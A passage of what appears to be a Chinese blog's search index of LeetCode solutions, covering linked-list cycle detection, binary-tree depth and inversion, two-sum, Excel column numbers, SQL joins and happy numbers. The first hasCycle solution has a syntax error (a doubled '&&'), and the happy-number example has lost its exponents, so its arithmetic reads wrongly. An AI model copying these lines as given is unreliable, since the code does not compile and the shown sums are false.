<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：head = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">0</span>,-<span class="number">4</span>], pos = <span class="number">1</span></span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释：链表中有一个环，其尾部连接到第二个节点。</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist.png" alt></p>
<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：head = [<span class="number">1</span>,<span class="number">2</span>], pos = <span class="number">0</span></span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释：链表中有一个环，其尾部连接到第一个节点。</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test2.png" alt></p>
<h2 id="示例3"><a href="#示例3" class="headerlink" title="示例3"></a>示例3</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：head = [<span class="number">1</span>], pos = -<span class="number">1</span></span><br><span class="line">输出：<span class="keyword">false</span></span><br><span class="line">解释：链表中没有环。</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test3.png" alt></p>
<h2 id="进阶："><a href="#进阶：" class="headerlink" title="进阶："></a>进阶：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">你能用 O(1)（即，常量）内存解决此问题吗？</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>使用快慢指针。快指针每次移动两步，慢指针每次移动一步，如果链表不存在环路，那么快指针将先到达链表尾部。如果链表存在环路，那么快指针在进入环路之后就一定会套圈慢指针。因此，只要判断快指针是否等于慢指针就行了，相等，则存在环路，否则不存在。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    ListNode head2 = head;</span><br><span class="line">    ListNode head1 = head;</span><br><span class="line">    <span class="keyword">while</span> (head1 != <span class="keyword">null</span> &amp;&amp; &amp;&amp; <span class="keyword">null</span> != head2 &amp;&amp; head2.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        head1 = head1.next;</span><br><span class="line">        head2 = head2.next.next;</span><br><span class="line">        <span class="keyword">if</span> (head1 == head2) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>使用哈希表，将每个访问过的结点保存到HashSet中，如果当前访问的结点已经在Set中了，说明存在环，如果当前结点为null说明不存在环。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    Set&lt;ListNode&gt; nodesSeen = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (head != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nodesSeen.contains(head)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            nodesSeen.add(head);</span><br><span class="line">        &#125;</span><br><span class="line">        head = head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>111. 二叉树的最小深度</title>
    <url>/2018/08/29/LeetCode/leetcode-000111.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E5%B0%8F%E6%B7%B1%E5%BA%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树，找出其最小深度。</p>
<p>最小深度是从根节点到最近叶子节点的最短路径上的节点数量。</p>
<p>说明: 叶子节点是指没有子节点的节点。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><p>给定二叉树 <code>[3,9,20,null,null,15,7]</code>,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">9  20</span><br><span class="line">  &#x2F;  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure>
<p>返回它的最小深度  2.</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归求最小深度</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">if</span>(root.left == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> minDepth(root.right) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root.right == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> minDepth(root.left) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> leftDepth = minDepth(root.left) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightDepth = minDepth(root.right) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> leftDepth &lt; rightDepth ? leftDepth : rightDepth;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>167. 两数之和 II 输入有序数组</title>
    <url>/2018/08/29/LeetCode/leetcode-000167-%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C%20II%20%E8%BE%93%E5%85%A5%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个已按照升序排列 的有序数组，找到两个数使得它们相加之和等于目标数。</p>
<p>函数应该返回这两个下标值 index1 和 index2，其中 index1 必须小于 index2。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: numbers &#x3D; [2, 7, 11, 15], target &#x3D; 9</span><br><span class="line">输出: [1,2]</span><br><span class="line">解释: 2 与 7 之和等于目标数 9 。因此 index1 &#x3D; 1, index2 &#x3D; 2 。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>双指针。一个指向begin，一个指向end，如果nums[begin] + nums[end] == target,返回</p>
<p>如果nums[begin] + nums[end] &lt; target, 说明和太小，begin自增</p>
<p>如果nums[begin] + nums[end] &gt; target,说明和太大，end自减</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] numbers, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">int</span> begin = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> end = numbers.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (begin &lt;= end) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (numbers[begin] + numbers[end] == target) &#123;</span><br><span class="line">        		<span class="keyword">break</span>;</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (numbers[begin] + numbers[end] &gt; target) &#123;</span><br><span class="line">        		end--;</span><br><span class="line">         	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (numbers[begin] + numbers[end] &lt; target) &#123;</span><br><span class="line">         		begin++;</span><br><span class="line">         	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;begin + <span class="number">1</span>, end + <span class="number">1</span>&#125;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>171. Excel表列序号</title>
    <url>/2018/08/29/LeetCode/leetcode-000171.%20Excel%E8%A1%A8%E5%88%97%E5%BA%8F%E5%8F%B7/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个Excel表格中的列名称，返回其相应的列序号。<br>例如，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A -&gt; 1</span><br><span class="line">B -&gt; 2</span><br><span class="line">C -&gt; 3</span><br><span class="line">...</span><br><span class="line">Z -&gt; 26</span><br><span class="line">AA -&gt; 27</span><br><span class="line">AB -&gt; 28 </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;A&quot;</span><br><span class="line">输出: 1</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;AB&quot;</span><br><span class="line">输出: 28</span><br></pre></td></tr></table></figure>
<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;ZY&quot;</span><br><span class="line">输出: 701</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>当做26进制处理</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">titleToNumber</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        init(map);</span><br><span class="line">        <span class="keyword">int</span> count = s.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">        	result += map.get(s.charAt(i)) * pow(<span class="number">26</span>, count--);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(Map&lt;Character, Integer&gt; map)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> c = <span class="string">'A'</span>;c &lt;= <span class="string">'Z'</span>;c++) &#123;</span><br><span class="line">			map.put(c, index++);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">pow</span><span class="params">(<span class="keyword">int</span> val, <span class="keyword">int</span> time)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; time;i++) &#123;</span><br><span class="line">			result *= val;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>181. 超过经理收入的员工</title>
    <url>/2018/08/29/LeetCode/leetcode-000181.%20%E8%B6%85%E8%BF%87%E7%BB%8F%E7%90%86%E6%94%B6%E5%85%A5%E7%9A%84%E5%91%98%E5%B7%A5/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><code>Employee</code> 表包含所有员工，他们的经理也属于员工。每个员工都有一个 Id，此外还有一列对应员工的经理的 Id。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+-------+--------+-----------+</span><br><span class="line">| Id | Name  | Salary | ManagerId |</span><br><span class="line">+----+-------+--------+-----------+</span><br><span class="line">| 1  | Joe   | 70000  | 3         |</span><br><span class="line">| 2  | Henry | 80000  | 4         |</span><br><span class="line">| 3  | Sam   | 60000  | NULL      |</span><br><span class="line">| 4  | Max   | 90000  | NULL      |</span><br><span class="line">+----+-------+--------+-----------+</span><br></pre></td></tr></table></figure>
<p>给定 <code>Employee</code> 表，编写一个 SQL 查询，该查询可以获取收入超过他们经理的员工的姓名。在上面的表格中，Joe 是唯一一个收入超过他的经理的员工。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----------+</span><br><span class="line">| Employee |</span><br><span class="line">+----------+</span><br><span class="line">| Joe      |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">as</span> Employee <span class="keyword">from</span> Employee <span class="keyword">as</span> e <span class="keyword">where</span> salary &gt; (<span class="keyword">select</span> salary <span class="keyword">from</span> employee <span class="keyword">where</span> <span class="keyword">id</span> = e.managerId);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>175. 组合两个表</title>
    <url>/2018/08/29/LeetCode/leetcode-000175.%20%E7%BB%84%E5%90%88%E4%B8%A4%E4%B8%AA%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>表1: Person</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------------+---------+</span><br><span class="line">| 列名         | 类型     |</span><br><span class="line">+-------------+---------+</span><br><span class="line">| PersonId    | int     |</span><br><span class="line">| FirstName   | varchar |</span><br><span class="line">| LastName    | varchar |</span><br><span class="line">+-------------+---------+</span><br><span class="line">PersonId 是上表主键</span><br></pre></td></tr></table></figure>
<p>表2: Address</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------------+---------+</span><br><span class="line">| 列名         | 类型    |</span><br><span class="line">+-------------+---------+</span><br><span class="line">| AddressId   | int     |</span><br><span class="line">| PersonId    | int     |</span><br><span class="line">| City        | varchar |</span><br><span class="line">| State       | varchar |</span><br><span class="line">+-------------+---------+</span><br><span class="line">AddressId 是上表主键</span><br></pre></td></tr></table></figure>

<p>编写一个 SQL 查询，满足条件：无论 person 是否有地址信息，都需要基于上述两表提供 person 的以下信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FirstName, LastName, City, State</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> FirstName, LastName, City, State <span class="keyword">from</span> Person <span class="keyword">left</span> <span class="keyword">join</span> Address <span class="keyword">on</span> Person.PersonId = Address.PersonId</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>183. 从不订购的客户</title>
    <url>/2018/08/29/LeetCode/leetcode-000183.%20%E4%BB%8E%E4%B8%8D%E8%AE%A2%E8%B4%AD%E7%9A%84%E5%AE%A2%E6%88%B7/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>某网站包含两个表，<code>Customers</code> 表和 <code>Orders</code> 表。编写一个 SQL 查询，找出所有从不订购任何东西的客户。</p>
<p><code>Customers</code> 表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+-------+</span><br><span class="line">| Id | Name  |</span><br><span class="line">+----+-------+</span><br><span class="line">| 1  | Joe   |</span><br><span class="line">| 2  | Henry |</span><br><span class="line">| 3  | Sam   |</span><br><span class="line">| 4  | Max   |</span><br><span class="line">+----+-------+</span><br></pre></td></tr></table></figure>
<p><code>Orders</code>表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+------------+</span><br><span class="line">| Id | CustomerId |</span><br><span class="line">+----+------------+</span><br><span class="line">| 1  | 3          |</span><br><span class="line">| 2  | 1          |</span><br><span class="line">+----+------------+</span><br></pre></td></tr></table></figure>
<p>例如给定上述表格，你的查询应返回：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------+</span><br><span class="line">| Customers |</span><br><span class="line">+-----------+</span><br><span class="line">| Henry     |</span><br><span class="line">| Max       |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>先从订单表中找出所有已经订购过的客户，然后排除掉这些客户即可，注意表头别名</p>
<h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>  <span class="keyword">as</span> Customers <span class="keyword">from</span> customers <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> customerId <span class="keyword">from</span> orders);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>202. 快乐数</title>
    <url>/2018/08/29/LeetCode/leetcode-000202.%20%E5%BF%AB%E4%B9%90%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个算法来判断一个数是不是“快乐数”。</p>
<p>一个“快乐数”定义为：对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和，然后重复这个过程直到这个数变为 1，也可能是无限循环但始终变不到 1。如果可以变为 1，那么这个数就是快乐数。</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">19</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br><span class="line">解释: </span><br><span class="line"><span class="number">12</span> + <span class="number">92</span> = <span class="number">82</span></span><br><span class="line"><span class="number">82</span> + <span class="number">22</span> = <span class="number">68</span></span><br><span class="line"><span class="number">62</span> + <span class="number">82</span> = <span class="number">100</span></span><br><span class="line"><span class="number">12</span> + <span class="number">02</span> + <span class="number">02</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>网络搜索到得知非快乐数有个特点，计算过程中肯定会有4出现，那么就可以用这个特性来判断了。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isHappy</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (n != <span class="number">1</span> &amp;&amp; n != <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            	<span class="keyword">int</span> nn = n % <span class="number">10</span>;</span><br><span class="line">            	temp += nn * nn;</span><br><span class="line">                n /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            n = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>还可以用Set来做判断，计算出来的数字是否已经出现过了，如果出现过了表示已经进入了一个“环路”，那么肯定是非快乐数了。<br>解法二参考：<a href="https://my.oschina.net/Tsybius2014/blog/524681" target="_blank" rel="noopener">https://my.oschina.net/Tsybius2014/blog/524681</a></p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @功能说明：LeetCode 202 - Happy Number</span></span><br><span class="line"><span class="comment"> * @开发人员：Tsybius2014</span></span><br><span class="line"><span class="comment"> * @开发时间：2015年11月1日</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 快乐的数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> n</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isHappy</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> temp = n;</span><br><span class="line">        HashSet&lt;Integer&gt; hashSet = <span class="keyword">new</span> HashSet&lt;Integer&gt;(); </span><br><span class="line">        hashSet.add(temp);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            temp = getNext(temp);</span><br><span class="line">            <span class="keyword">if</span> (temp == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (hashSet.contains(temp)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            hashSet.add(temp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取下一个快乐的数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> num</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getNext</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            result += (num % <span class="number">10</span>) * (num % <span class="number">10</span>);</span><br><span class="line">            num = num / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
        <tag>快乐数</tag>
      </tags>
  </entry>
  <entry>
    <title>226. 翻转二叉树</title>
    <url>/2018/08/29/LeetCode/leetcode-000226.%20%E7%BF%BB%E8%BD%AC%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>翻转一棵二叉树。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><p>输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">     4</span><br><span class="line">   &#x2F;   \</span><br><span class="line">  2     7</span><br><span class="line"> &#x2F; \   &#x2F; \</span><br><span class="line">1   3 6   9</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">     4</span><br><span class="line">   &#x2F;   \</span><br><span class="line">  7     2</span><br><span class="line"> &#x2F; \   &#x2F; \</span><br><span class="line">9   6 3   1</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">exchange</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">	    TreeNode node = root;</span><br><span class="line">	    <span class="keyword">if</span>(node != <span class="keyword">null</span>)&#123;</span><br><span class="line">	        TreeNode temp = node.left;</span><br><span class="line">	        node.left = node.right;</span><br><span class="line">	        node.right = temp;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> TreeNode <span class="title">invertTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">		TreeNode node = root;</span><br><span class="line">	    </span><br><span class="line">		<span class="keyword">if</span>(root == <span class="keyword">null</span>) &#123;</span><br><span class="line">	        <span class="keyword">return</span> root;</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    invertTree(node.left);</span><br><span class="line">	    invertTree(node.right);</span><br><span class="line">	    exchange(node);</span><br><span class="line">	    <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>292. Nim游戏</title>
    <url>/2018/08/29/LeetCode/leetcode-000292.%20Nim%E6%B8%B8%E6%88%8F/</url>
